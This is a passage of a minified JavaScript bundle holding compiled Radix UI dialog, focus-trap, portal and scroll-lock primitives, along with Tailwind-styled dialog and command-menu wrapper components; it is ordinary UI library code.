      return typeof window < "u" && (window[Symbol.for("radix-ui")] = !0), E.jsx(s, {
        ...l,
        ref: o
      });
    });
    return n.displayName = `Primitive.${t}`, {
      ...e,
      [t]: n
    };
  }, {});
function YS(e, t) {
  e && Un.flushSync(() => e.dispatchEvent(t));
}
function XS(e, t = null == globalThis ? void 0 : globalThis.document) {
  const n = Dt(e);
  c.useEffect(() => {
    const r = o => {
      "Escape" === o.key && n(o);
    };
    return t.addEventListener("keydown", r, {
      capture: !0
    }), () => t.removeEventListener("keydown", r, {
      capture: !0
    });
  }, [n, t]);
}
var df,
  ZS = "DismissableLayer",
  Qa = "dismissableLayer.update",
  JS = "dismissableLayer.pointerDownOutside",
  qS = "dismissableLayer.focusOutside",
  Uv = c.createContext({
    layers: new Set(),
    layersWithOutsidePointerEventsDisabled: new Set(),
    branches: new Set()
  }),
  cc = c.forwardRef((e, t) => {
    var _ref;
    const {
        disableOutsidePointerEvents: n = !1,
        onEscapeKeyDown: r,
        onPointerDownOutside: o,
        onFocusOutside: i,
        onInteractOutside: l,
        onDismiss: s,
        ...a
      } = e,
      u = c.useContext(Uv),
      [d, f] = c.useState(null),
      v = (_ref = null == d ? void 0 : d.ownerDocument) !== null && _ref !== void 0 ? _ref : null == globalThis ? void 0 : globalThis.document,
      [, g] = c.useState({}),
      x = dt(t, k => f(k)),
      h = Array.from(u.layers),
      [w] = [...u.layersWithOutsidePointerEventsDisabled].slice(-1),
      m = h.indexOf(w),
      p = d ? h.indexOf(d) : -1,
      y = u.layersWithOutsidePointerEventsDisabled.size > 0,
      S = p >= m,
      C = nE(k => {
        const b = k.target,
          T = [...u.branches].some(O => O.contains(b));
        !S || T || (null == o || o(k), null == l || l(k), k.defaultPrevented || null == s || s());
      }, v),
      P = rE(k => {
        const b = k.target;
        [...u.branches].some(O => O.contains(b)) || (null == i || i(k), null == l || l(k), k.defaultPrevented || null == s || s());
      }, v);
    return XS(k => {
      p === u.layers.size - 1 && (null == r || r(k), !k.defaultPrevented && s && (k.preventDefault(), s()));
    }, v), c.useEffect(() => {
      if (d) return n && (0 === u.layersWithOutsidePointerEventsDisabled.size && (df = v.body.style.pointerEvents, v.body.style.pointerEvents = "none"), u.layersWithOutsidePointerEventsDisabled.add(d)), u.layers.add(d), ff(), () => {
        n && 1 === u.layersWithOutsidePointerEventsDisabled.size && (v.body.style.pointerEvents = df);
      };
    }, [d, v, n, u]), c.useEffect(() => () => {
      d && (u.layers.delete(d), u.layersWithOutsidePointerEventsDisabled.delete(d), ff());
    }, [d, u]), c.useEffect(() => {
      const k = () => g({});
      return document.addEventListener(Qa, k), () => document.removeEventListener(Qa, k);
    }, []), E.jsx(fe.div, {
      ...a,
      ref: x,
      style: {
        pointerEvents: y ? S ? "auto" : "none" : void 0,
        ...e.style
      },
      onFocusCapture: Ue(e.onFocusCapture, P.onFocusCapture),
      onBlurCapture: Ue(e.onBlurCapture, P.onBlurCapture),
      onPointerDownCapture: Ue(e.onPointerDownCapture, C.onPointerDownCapture)
    });
  });
cc.displayName = ZS;
var eE = "DismissableLayerBranch",
  tE = c.forwardRef((e, t) => {
    const n = c.useContext(Uv),
      r = c.useRef(null),
      o = dt(t, r);
    return c.useEffect(() => {
      const i = r.current;
      if (i) return n.branches.add(i), () => {
        n.branches.delete(i);
      };
    }, [n.branches]), E.jsx(fe.div, {
      ...e,
      ref: o
    });
  });
function nE(e, t = null == globalThis ? void 0 : globalThis.document) {
  const n = Dt(e),
    r = c.useRef(!1),
    o = c.useRef(() => {});
  return c.useEffect(() => {
    const i = s => {
        if (s.target && !r.current) {
          let a = function () {
            Wv(JS, n, u, {
              discrete: !0
            });
          };
          const u = {
            originalEvent: s
          };
          "touch" === s.pointerType ? (t.removeEventListener("click", o.current), o.current = a, t.addEventListener("click", o.current, {
            once: !0
          })) : a();
        } else t.removeEventListener("click", o.current);
        r.current = !1;
      },
      l = window.setTimeout(() => {
        t.addEventListener("pointerdown", i);
      }, 0);
    return () => {
      window.clearTimeout(l), t.removeEventListener("pointerdown", i), t.removeEventListener("click", o.current);
    };
  }, [t, n]), {
    onPointerDownCapture: () => r.current = !0
  };
}
function rE(e, t = null == globalThis ? void 0 : globalThis.document) {
  const n = Dt(e),
    r = c.useRef(!1);
  return c.useEffect(() => {
    const o = i => {
      i.target && !r.current && Wv(qS, n, {
        originalEvent: i
      }, {
        discrete: !1
      });
    };
    return t.addEventListener("focusin", o), () => t.removeEventListener("focusin", o);
  }, [t, n]), {
    onFocusCapture: () => r.current = !0,
    onBlurCapture: () => r.current = !1
  };
}
function ff() {
  const e = new CustomEvent(Qa);
  document.dispatchEvent(e);
}
function Wv(e, t, n, {
  discrete: r
}) {
  const o = n.originalEvent.target,
    i = new CustomEvent(e, {
      bubbles: !1,
      cancelable: !0,
      detail: n
    });
  t && o.addEventListener(e, t, {
    once: !0
  }), r ? YS(o, i) : o.dispatchEvent(i);
}
tE.displayName = eE;
var Ts = "focusScope.autoFocusOnMount",
  Ds = "focusScope.autoFocusOnUnmount",
  pf = {
    bubbles: !1,
    cancelable: !0
  },
  oE = "FocusScope",
  dc = c.forwardRef((e, t) => {
    const {
        loop: n = !1,
        trapped: r = !1,
        onMountAutoFocus: o,
        onUnmountAutoFocus: i,
        ...l
      } = e,
      [s, a] = c.useState(null),
      u = Dt(o),
      d = Dt(i),
      f = c.useRef(null),
      v = dt(t, h => a(h)),
      g = c.useRef({
        paused: !1,
        pause() {
          this.paused = !0;
        },
        resume() {
          this.paused = !1;
        }
      }).current;
    c.useEffect(() => {
      if (r) {
        let h = function (y) {
            if (g.paused || !s) return;
            const S = y.target;
            s.contains(S) ? f.current = S : Bt(f.current, {
              select: !0
            });
          },
          w = function (y) {
            if (g.paused || !s) return;
            const S = y.relatedTarget;
            null !== S && (s.contains(S) || Bt(f.current, {
              select: !0
            }));
          },
          m = function (y) {
            if (document.activeElement === document.body) for (const C of y) C.removedNodes.length > 0 && Bt(s);
          };
        document.addEventListener("focusin", h), document.addEventListener("focusout", w);
        const p = new MutationObserver(m);
        return s && p.observe(s, {
          childList: !0,
          subtree: !0
        }), () => {
          document.removeEventListener("focusin", h), document.removeEventListener("focusout", w), p.disconnect();
        };
      }
    }, [r, s, g.paused]), c.useEffect(() => {
      if (s) {
        vf.add(g);
        const h = document.activeElement;
        if (!s.contains(h)) {
          const m = new CustomEvent(Ts, pf);
          s.addEventListener(Ts, u), s.dispatchEvent(m), m.defaultPrevented || (iE(cE(Bv(s)), {
            select: !0
          }), document.activeElement === h && Bt(s));
        }
        return () => {
          s.removeEventListener(Ts, u), setTimeout(() => {
            const m = new CustomEvent(Ds, pf);
            s.addEventListener(Ds, d), s.dispatchEvent(m), m.defaultPrevented || Bt(h !== null && h !== void 0 ? h : document.body, {
              select: !0
            }), s.removeEventListener(Ds, d), vf.remove(g);
          }, 0);
        };
      }
    }, [s, u, d, g]);
    const x = c.useCallback(h => {
      if (!n && !r || g.paused) return;
      const w = "Tab" === h.key && !h.altKey && !h.ctrlKey && !h.metaKey,
        m = document.activeElement;
      if (w && m) {
        const p = h.currentTarget,
          [y, S] = lE(p);
        y && S ? h.shiftKey || m !== S ? h.shiftKey && m === y && (h.preventDefault(), n && Bt(S, {
          select: !0
        })) : (h.preventDefault(), n && Bt(y, {
          select: !0
        })) : m === p && h.preventDefault();
      }
    }, [n, r, g.paused]);
    return E.jsx(fe.div, {
      tabIndex: -1,
      ...l,
      ref: v,
      onKeyDown: x
    });
  });
function iE(e, {
  select: t = !1
} = {}) {
  const n = document.activeElement;
  for (const r of e) if (Bt(r, {
    select: t
  }), document.activeElement !== n) return;
}
function lE(e) {
  const t = Bv(e);
  return [mf(t, e), mf(t.reverse(), e)];
}
function Bv(e) {
  const t = [],
    n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
      acceptNode: r => {
        const o = "INPUT" === r.tagName && "hidden" === r.type;
        return r.disabled || r.hidden || o ? NodeFilter.FILTER_SKIP : r.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP;
      }
    });
  for (; n.nextNode();) t.push(n.currentNode);
  return t;
}
function mf(e, t) {
  for (const n of e) if (!sE(n, {
    upTo: t
  })) return n;
}
function sE(e, {
  upTo: t
}) {
  if ("hidden" === getComputedStyle(e).visibility) return !0;
  for (; e;) {
    if (void 0 !== t && e === t) return !1;
    if ("none" === getComputedStyle(e).display) return !0;
    e = e.parentElement;
  }
  return !1;
}
function aE(e) {
  return e instanceof HTMLInputElement && "select" in e;
}
function Bt(e, {
  select: t = !1
} = {}) {
  if (e && e.focus) {
    const n = document.activeElement;
    e.focus({
      preventScroll: !0
    }), e !== n && aE(e) && t && e.select();
  }
}
dc.displayName = oE;
var vf = uE();
function uE() {
  let e = [];
  return {
    add(t) {
      const n = e[0];
      t !== n && (null == n || n.pause()), e = hf(e, t), e.unshift(t);
    },
    remove(t) {
      var n;
      e = hf(e, t), null == (n = e[0]) || n.resume();
    }
  };
}
function hf(e, t) {
  const n = [...e],
    r = n.indexOf(t);
  return -1 !== r && n.splice(r, 1), n;
}
function cE(e) {
  return e.filter(t => "A" !== t.tagName);
}
var dE = "Portal",
  fc = c.forwardRef((e, t) => {
    var s;
    const {
        container: n,
        ...r
      } = e,
      [o, i] = c.useState(!1);
    Tt(() => i(!0), []);
    const l = n || o && (null == (s = null == globalThis ? void 0 : globalThis.document) ? void 0 : s.body);
    return l ? tv.createPortal(E.jsx(fe.div, {
      ...r,
      ref: t
    }), l) : null;
  });
function fE(e, t) {
  return c.useReducer((n, r) => {
    var _t$n$r2;
    return (_t$n$r2 = t[n][r]) !== null && _t$n$r2 !== void 0 ? _t$n$r2 : n;
  }, e);
}
fc.displayName = dE;
var Ir = e => {
  const {
      present: t,
      children: n
    } = e,
    r = pE(t),
    o = "function" == typeof n ? n({
      present: r.isPresent
    }) : c.Children.only(n),
    i = dt(r.ref, mE(o));
  return "function" == typeof n || r.isPresent ? c.cloneElement(o, {
    ref: i
  }) : null;
};
function pE(e) {
  const [t, n] = c.useState(),
    r = c.useRef({}),
    o = c.useRef(e),
    i = c.useRef("none"),
    l = e ? "mounted" : "unmounted",
    [s, a] = fE(l, {
      mounted: {
        UNMOUNT: "unmounted",
        ANIMATION_OUT: "unmountSuspended"
      },
      unmountSuspended: {
        MOUNT: "mounted",
        ANIMATION_END: "unmounted"
      },
      unmounted: {
        MOUNT: "mounted"
      }
    });
  return c.useEffect(() => {
    const u = wi(r.current);
    i.current = "mounted" === s ? u : "none";
  }, [s]), Tt(() => {
    const u = r.current,
      d = o.current;
    if (d !== e) {
      const v = i.current,
        g = wi(u);
      e ? a("MOUNT") : "none" === g || "none" === (null == u ? void 0 : u.display) ? a("UNMOUNT") : a(d && v !== g ? "ANIMATION_OUT" : "UNMOUNT"), o.current = e;
    }
  }, [e, a]), Tt(() => {
    if (t) {
      const u = f => {
          const g = wi(r.current).includes(f.animationName);
          f.target === t && g && Un.flushSync(() => a("ANIMATION_END"));
        },
        d = f => {
          f.target === t && (i.current = wi(r.current));
        };
      return t.addEventListener("animationstart", d), t.addEventListener("animationcancel", u), t.addEventListener("animationend", u), () => {
        t.removeEventListener("animationstart", d), t.removeEventListener("animationcancel", u), t.removeEventListener("animationend", u);
      };
    }
    a("ANIMATION_END");
  }, [t, a]), {
    isPresent: ["mounted", "unmountSuspended"].includes(s),
    ref: c.useCallback(u => {
      u && (r.current = getComputedStyle(u)), n(u);
    }, [])
  };
}
function wi(e) {
  return (null == e ? void 0 : e.animationName) || "none";
}
function mE(e) {
  var r, o;
  let t = null == (r = Object.getOwnPropertyDescriptor(e.props, "ref")) ? void 0 : r.get,
    n = t && "isReactWarning" in t && t.isReactWarning;
  return n ? e.ref : (t = null == (o = Object.getOwnPropertyDescriptor(e, "ref")) ? void 0 : o.get, n = t && "isReactWarning" in t && t.isReactWarning, n ? e.props.ref : e.props.ref || e.ref);
}
Ir.displayName = "Presence";
var Is = 0;
function Vv() {
  c.useEffect(() => {
    var _e$, _e$2;
    const e = document.querySelectorAll("[data-radix-focus-guard]");
    return document.body.insertAdjacentElement("afterbegin", (_e$ = e[0]) !== null && _e$ !== void 0 ? _e$ : gf()), document.body.insertAdjacentElement("beforeend", (_e$2 = e[1]) !== null && _e$2 !== void 0 ? _e$2 : gf()), Is++, () => {
      1 === Is && document.querySelectorAll("[data-radix-focus-guard]").forEach(t => t.remove()), Is--;
    };
  }, []);
}
function gf() {
  const e = document.createElement("span");
  return e.setAttribute("data-radix-focus-guard", ""), e.tabIndex = 0, e.style.cssText = "outline: none; opacity: 0; position: fixed; pointer-events: none", e;
}
var Hv = fv(),
  Ms = function () {},
  Wl = c.forwardRef(function (e, t) {
    var n = c.useRef(null),
      r = c.useState({
        onScrollCapture: Ms,
        onWheelCapture: Ms,
        onTouchMoveCapture: Ms
      }),
      o = r[0],
      i = r[1],
      l = e.forwardProps,
      s = e.children,
      a = e.className,
      u = e.removeScrollBar,
      d = e.enabled,
      f = e.shards,
      v = e.sideCar,
      g = e.noIsolation,
      x = e.inert,
      h = e.allowPinchZoom,
      w = e.as,
      m = void 0 === w ? "div" : w,
      p = e.gapMode,
      y = oc(e, ["forwardProps", "children", "className", "removeScrollBar", "enabled", "shards", "sideCar", "noIsolation", "inert", "allowPinchZoom", "as", "gapMode"]),
      S = v,
      C = dv([n, t]),
      P = Se(Se({}, y), o);
    return c.createElement(c.Fragment, null, d && c.createElement(S, {
      sideCar: Hv,
      removeScrollBar: u,
      shards: f,
      noIsolation: g,
      inert: x,
      setCallbacks: i,
      allowPinchZoom: !!h,
      lockRef: n,
      gapMode: p
    }), l ? c.cloneElement(c.Children.only(s), Se(Se({}, P), {
      ref: C
    })) : c.createElement(m, Se({}, P, {
      className: a,
      ref: C
    }), s));
  });
Wl.defaultProps = {
  enabled: !0,
  removeScrollBar: !0,
  inert: !1
}, Wl.classNames = {
  fullWidth: co,
  zeroRight: uo
};
var Ya = !1;
if (typeof window < "u") try {
  var xi = Object.defineProperty({}, "passive", {
    get: function () {
      return Ya = !0, !0;
    }
  });
  window.addEventListener("test", xi, xi), window.removeEventListener("test", xi, xi);
} catch {
  Ya = !1;
}
var Yn = !!Ya && {
    passive: !1
  },
  vE = function (e) {
    return "TEXTAREA" === e.tagName;
  },
  Kv = function (e, t) {
    var n = window.getComputedStyle(e);
    return "hidden" !== n[t] && !(n.overflowY === n.overflowX && !vE(e) && "visible" === n[t]);
  },
  hE = function (e) {
    return Kv(e, "overflowY");
  },
  gE = function (e) {
    return Kv(e, "overflowX");
  },
  yf = function (e, t) {
    var n = t.ownerDocument,
      r = t;
    do {
      if (typeof ShadowRoot < "u" && r instanceof ShadowRoot && (r = r.host), Gv(e, r)) {
        var i = Qv(e, r);
        if (i[1] > i[2]) return !0;
      }
      r = r.parentNode;
    } while (r && r !== n.body);
    return !1;
  },
  yE = function (e) {
    return [e.scrollTop, e.scrollHeight, e.clientHeight];
  },
  wE = function (e) {
    return [e.scrollLeft, e.scrollWidth, e.clientWidth];
  },
  Gv = function (e, t) {
    return "v" === e ? hE(t) : gE(t);
  },
  Qv = function (e, t) {
    return "v" === e ? yE(t) : wE(t);
  },
  xE = function (e, t) {
    return "h" === e && "rtl" === t ? -1 : 1;
  },
  SE = function (e, t, n, r, o) {
    var i = xE(e, window.getComputedStyle(t).direction),
      l = i * r,
      s = n.target,
      a = t.contains(s),
      u = !1,
      d = l > 0,
      f = 0,
      v = 0;
    do {
      var g = Qv(e, s),
        x = g[0],
        m = g[1] - g[2] - i * x;
      (x || m) && Gv(e, s) && (f += m, v += x), s = s instanceof ShadowRoot ? s.host : s.parentNode;
    } while (!a && s !== document.body || a && (t.contains(s) || t === s));
    return (d && (Math.abs(f) < 1 || !o) || !d && (Math.abs(v) < 1 || !o)) && (u = !0), u;
  },
  Si = function (e) {
    return "changedTouches" in e ? [e.changedTouches[0].clientX, e.changedTouches[0].clientY] : [0, 0];
  },
  wf = function (e) {
    return [e.deltaX, e.deltaY];
  },
  xf = function (e) {
    return e && "current" in e ? e.current : e;
  },
  EE = function (e, t) {
    return e[0] === t[0] && e[1] === t[1];
  },
  CE = function (e) {
    return "\n  .block-interactivity-".concat(e, " {pointer-events: none;}\n  .allow-interactivity-").concat(e, " {pointer-events: all;}\n");
  },
  kE = 0,
  Xn = [];
function PE(e) {
  var t = c.useRef([]),
    n = c.useRef([0, 0]),
    r = c.useRef(),
    o = c.useState(kE++)[0],
    i = c.useState(ic)[0],
    l = c.useRef(e);
  c.useEffect(function () {
    l.current = e;
  }, [e]), c.useEffect(function () {
    if (e.inert) {
      document.body.classList.add("block-interactivity-".concat(o));
      var h = cv([e.lockRef.current], (e.shards || []).map(xf), !0).filter(Boolean);
      return h.forEach(function (w) {
        return w.classList.add("allow-interactivity-".concat(o));
      }), function () {
        document.body.classList.remove("block-interactivity-".concat(o)), h.forEach(function (w) {
          return w.classList.remove("allow-interactivity-".concat(o));
        });
      };
    }
  }, [e.inert, e.lockRef.current, e.shards]);
  var s = c.useCallback(function (h, w) {
      if ("touches" in h && 2 === h.touches.length) return !l.current.allowPinchZoom;
      var C,
        m = Si(h),
        p = n.current,
        y = "deltaX" in h ? h.deltaX : p[0] - m[0],
        S = "deltaY" in h ? h.deltaY : p[1] - m[1],
        P = h.target,
        k = Math.abs(y) > Math.abs(S) ? "h" : "v";
      if ("touches" in h && "h" === k && "range" === P.type) return !1;
      var b = yf(k, P);
      if (!b) return !0;
      if (b ? C = k : (C = "v" === k ? "h" : "v", b = yf(k, P)), !b) return !1;
      if (!r.current && "changedTouches" in h && (y || S) && (r.current = C), !C) return !0;
      var T = r.current || C;
      return SE(T, w, h, "h" === T ? y : S, !0);
    }, []),
    a = c.useCallback(function (h) {
      var w = h;
      if (Xn.length && Xn[Xn.length - 1] === i) {
        var m = "deltaY" in w ? wf(w) : Si(w),
          p = t.current.filter(function (C) {
            return C.name === w.type && (C.target === w.target || w.target === C.shadowParent) && EE(C.delta, m);
          })[0];
        if (p && p.should) return void (w.cancelable && w.preventDefault());
        if (!p) {
          var y = (l.current.shards || []).map(xf).filter(Boolean).filter(function (C) {
            return C.contains(w.target);
          });
          (y.length > 0 ? s(w, y[0]) : !l.current.noIsolation) && w.cancelable && w.preventDefault();
        }
      }
    }, []),
    u = c.useCallback(function (h, w, m, p) {
      var y = {
        name: h,
        delta: w,
        target: m,
        should: p,
        shadowParent: _E(m)
      };
      t.current.push(y), setTimeout(function () {
        t.current = t.current.filter(function (S) {
          return S !== y;
        });
      }, 1);
    }, []),
    d = c.useCallback(function (h) {
      n.current = Si(h), r.current = void 0;
    }, []),
    f = c.useCallback(function (h) {
      u(h.type, wf(h), h.target, s(h, e.lockRef.current));
    }, []),
    v = c.useCallback(function (h) {
      u(h.type, Si(h), h.target, s(h, e.lockRef.current));
    }, []);
  c.useEffect(function () {
    return Xn.push(i), e.setCallbacks({
      onScrollCapture: f,
      onWheelCapture: f,
      onTouchMoveCapture: v
    }), document.addEventListener("wheel", a, Yn), document.addEventListener("touchmove", a, Yn), document.addEventListener("touchstart", d, Yn), function () {
      Xn = Xn.filter(function (h) {
        return h !== i;
      }), document.removeEventListener("wheel", a, Yn), document.removeEventListener("touchmove", a, Yn), document.removeEventListener("touchstart", d, Yn);
    };
  }, []);
  var g = e.removeScrollBar,
    x = e.inert;
  return c.createElement(c.Fragment, null, x ? c.createElement(i, {
    styles: CE(o)
  }) : null, g ? c.createElement(hv, {
    gapMode: e.gapMode
  }) : null);
}
function _E(e) {
  for (var t = null; null !== e;) e instanceof ShadowRoot && (t = e.host, e = e.host), e = e.parentNode;
  return t;
}
const bE = mv(Hv, PE);
var pc = c.forwardRef(function (e, t) {
  return c.createElement(Wl, Se({}, e, {
    ref: t,
    sideCar: bE
  }));
});
pc.classNames = Wl.classNames;
var Yv = "Dialog",
  [Xv, AP] = Vo(Yv),
  [TP, ft] = Xv(Yv),
  Zv = "DialogTrigger",
  NE = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        ...r
      } = e,
      o = ft(Zv, n),
      i = dt(t, o.triggerRef);
    return E.jsx(fe.button, {
      type: "button",
      "aria-haspopup": "dialog",
      "aria-expanded": o.open,
      "aria-controls": o.contentId,
      "data-state": hc(o.open),
      ...r,
      ref: i,
      onClick: Ue(e.onClick, o.onOpenToggle)
    });
  });
NE.displayName = Zv;
var mc = "DialogPortal",
  [$E, Jv] = Xv(mc, {
    forceMount: void 0
  }),
  qv = e => {
    const {
        __scopeDialog: t,
        forceMount: n,
        children: r,
        container: o
      } = e,
      i = ft(mc, t);
    return E.jsx($E, {
      scope: t,
      forceMount: n,
      children: c.Children.map(r, l => E.jsx(Ir, {
        present: n || i.open,
        children: E.jsx(fc, {
          asChild: !0,
          container: o,
          children: l
        })
      }))
    });
  };
qv.displayName = mc;
var fl = "DialogOverlay",
  eh = c.forwardRef((e, t) => {
    const n = Jv(fl, e.__scopeDialog),
      {
        forceMount: r = n.forceMount,
        ...o
      } = e,
      i = ft(fl, e.__scopeDialog);
    return i.modal ? E.jsx(Ir, {
      present: r || i.open,
      children: E.jsx(RE, {
        ...o,
        ref: t
      })
    }) : null;
  });
eh.displayName = fl;
var RE = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        ...r
      } = e,
      o = ft(fl, n);
    return E.jsx(pc, {
      as: Ho,
      allowPinchZoom: !0,
      shards: [o.contentRef],
      children: E.jsx(fe.div, {
        "data-state": hc(o.open),
        ...r,
        ref: t,
        style: {
          pointerEvents: "auto",
          ...r.style
        }
      })
    });
  }),
  In = "DialogContent",
  th = c.forwardRef((e, t) => {
    const n = Jv(In, e.__scopeDialog),
      {
        forceMount: r = n.forceMount,
        ...o
      } = e,
      i = ft(In, e.__scopeDialog);
    return E.jsx(Ir, {
      present: r || i.open,
      children: i.modal ? E.jsx(OE, {
        ...o,
        ref: t
      }) : E.jsx(AE, {
        ...o,
        ref: t
      })
    });
  });
th.displayName = In;
var OE = c.forwardRef((e, t) => {
    const n = ft(In, e.__scopeDialog),
      r = c.useRef(null),
      o = dt(t, n.contentRef, r);
    return c.useEffect(() => {
      const i = r.current;
      if (i) return lc(i);
    }, []), E.jsx(nh, {
      ...e,
      ref: o,
      trapFocus: n.open,
      disableOutsidePointerEvents: !0,
      onCloseAutoFocus: Ue(e.onCloseAutoFocus, i => {
        var l;
        i.preventDefault(), null == (l = n.triggerRef.current) || l.focus();
      }),
      onPointerDownOutside: Ue(e.onPointerDownOutside, i => {
        const l = i.detail.originalEvent,
          s = 0 === l.button && !0 === l.ctrlKey;
        (2 === l.button || s) && i.preventDefault();
      }),
      onFocusOutside: Ue(e.onFocusOutside, i => i.preventDefault())
    });
  }),
  AE = c.forwardRef((e, t) => {
    const n = ft(In, e.__scopeDialog),
      r = c.useRef(!1),
      o = c.useRef(!1);
    return E.jsx(nh, {
      ...e,
      ref: t,
      trapFocus: !1,
      disableOutsidePointerEvents: !1,
      onCloseAutoFocus: i => {
        var l, s;
        null == (l = e.onCloseAutoFocus) || l.call(e, i), i.defaultPrevented || (r.current || null == (s = n.triggerRef.current) || s.focus(), i.preventDefault()), r.current = !1, o.current = !1;
      },
      onInteractOutside: i => {
        var a, u;
        null == (a = e.onInteractOutside) || a.call(e, i), i.defaultPrevented || (r.current = !0, "pointerdown" === i.detail.originalEvent.type && (o.current = !0));
        const l = i.target;
        (null == (u = n.triggerRef.current) ? void 0 : u.contains(l)) && i.preventDefault(), "focusin" === i.detail.originalEvent.type && o.current && i.preventDefault();
      }
    });
  }),
  nh = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        trapFocus: r,
        onOpenAutoFocus: o,
        onCloseAutoFocus: i,
        ...l
      } = e,
      s = ft(In, n),
      a = c.useRef(null),
      u = dt(t, a);
    return Vv(), E.jsxs(E.Fragment, {
      children: [E.jsx(dc, {
        asChild: !0,
        loop: !0,
        trapped: r,
        onMountAutoFocus: o,
        onUnmountAutoFocus: i,
        children: E.jsx(cc, {
          role: "dialog",
          id: s.contentId,
          "aria-describedby": s.descriptionId,
          "aria-labelledby": s.titleId,
          "data-state": hc(s.open),
          ...l,
          ref: u,
          onDismiss: () => s.onOpenChange(!1)
        })
      }), E.jsxs(E.Fragment, {
        children: [E.jsx(TE, {
          titleId: s.titleId
        }), E.jsx(IE, {
          contentRef: a,
          descriptionId: s.descriptionId
        })]
      })]
    });
  }),
  vc = "DialogTitle",
  rh = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        ...r
      } = e,
      o = ft(vc, n);
    return E.jsx(fe.h2, {
      id: o.titleId,
      ...r,
      ref: t
    });
  });
rh.displayName = vc;
var oh = "DialogDescription",
  ih = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        ...r
      } = e,
      o = ft(oh, n);
    return E.jsx(fe.p, {
      id: o.descriptionId,
      ...r,
      ref: t
    });
  });
ih.displayName = oh;
var lh = "DialogClose",
  sh = c.forwardRef((e, t) => {
    const {
        __scopeDialog: n,
        ...r
      } = e,
      o = ft(lh, n);
    return E.jsx(fe.button, {
      type: "button",
      ...r,
      ref: t,
      onClick: Ue(e.onClick, () => o.onOpenChange(!1))
    });
  });
function hc(e) {
  return e ? "open" : "closed";
}
sh.displayName = lh;
var ah = "DialogTitleWarning",
  [DP, uh] = LS(ah, {
    contentName: In,
    titleName: vc,
    docsSlug: "dialog"
  }),
  TE = ({
    titleId: e
  }) => {
    const t = uh(ah),
      n = `\`${t.contentName}\` requires a \`${t.titleName}\` for the component to be accessible for screen reader users.\n\nIf you want to hide the \`${t.titleName}\`, you can wrap it with our VisuallyHidden component.\n\nFor more information, see https://radix-ui.com/primitives/docs/components/${t.docsSlug}`;
    return c.useEffect(() => {
      e && (document.getElementById(e) || console.error(n));
    }, [n, e]), null;
  },
  DE = "DialogDescriptionWarning",
  IE = ({
    contentRef: e,
    descriptionId: t
  }) => {
    const r = `Warning: Missing \`Description\` or \`aria-describedby={undefined}\` for {${uh(DE).contentName}}.`;
    return c.useEffect(() => {
      var i;
      const o = null == (i = e.current) ? void 0 : i.getAttribute("aria-describedby");
      t && o && (document.getElementById(t) || console.warn(r));
    }, [r, e, t]), null;
  },
  ME = qv,
  ch = eh,
  dh = th,
  fh = rh,
  ph = ih,
  LE = sh;
const jE = ME,
  mh = c.forwardRef(({
    className: e,
    ...t
  }, n) => E.jsx(ch, {
    ref: n,
    className: ne("fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0", e),
    ...t
  }));
mh.displayName = ch.displayName;
const zE = c.forwardRef(({
  className: e,
  children: t,
  ...n
}, r) => E.jsxs(jE, {
  children: [E.jsx(mh, {}), E.jsxs(dh, {
    ref: r,
    className: ne("fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border bg-background p-6 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg", e),
    ...n,
    children: [t, E.jsxs(LE, {
      className: "absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground",
      children: [E.jsx(x1, {
        className: "h-4 w-4"
      }), E.jsx("span", {
        className: "sr-only",
        children: "Close"
      })]
    })]
  })]
}));
zE.displayName = dh.displayName;
const FE = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(fh, {
  ref: n,
  className: ne("text-lg font-semibold leading-none tracking-tight", e),
  ...t
}));
FE.displayName = fh.displayName;
const UE = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(ph, {
  ref: n,
  className: ne("text-sm text-muted-foreground", e),
  ...t
}));
UE.displayName = ph.displayName;
const vh = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(De, {
  ref: n,
  className: ne("flex h-full w-full flex-col overflow-hidden rounded-md bg-popover text-popover-foreground", e),
  ...t
}));
vh.displayName = De.displayName;
const hh = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsxs("div", {
  className: "flex items-center border-b px-3",
  "cmdk-input-wrapper": "",
  children: [E.jsx(y1, {
    className: "mr-2 h-4 w-4 shrink-0 opacity-50"
  }), E.jsx(De.Input, {
    ref: n,
    className: ne("flex h-11 w-full rounded-md bg-transparent py-3 text-sm outline-none placeholder:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50", e),
    ...t
  })]
}));
hh.displayName = De.Input.displayName;
const gh = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(De.List, {
  ref: n,
  className: ne("max-h-[300px] overflow-y-auto overflow-x-hidden", e),
  ...t
}));
gh.displayName = De.List.displayName;
const yh = c.forwardRef((e, t) => E.jsx(De.Empty, {
  ref: t,
  className: "py-6 text-center text-sm",
  ...e
}));
yh.displayName = De.Empty.displayName;
const wh = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(De.Group, {
  ref: n,
  className: ne("overflow-hidden p-1 text-foreground [&_[cmdk-group-heading]]:px-2 [&_[cmdk-group-heading]]:py-1.5 [&_[cmdk-group-heading]]:text-xs [&_[cmdk-group-heading]]:font-medium [&_[cmdk-group-heading]]:text-muted-foreground", e),
  ...t
}));
wh.displayName = De.Group.displayName;
const WE = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(De.Separator, {
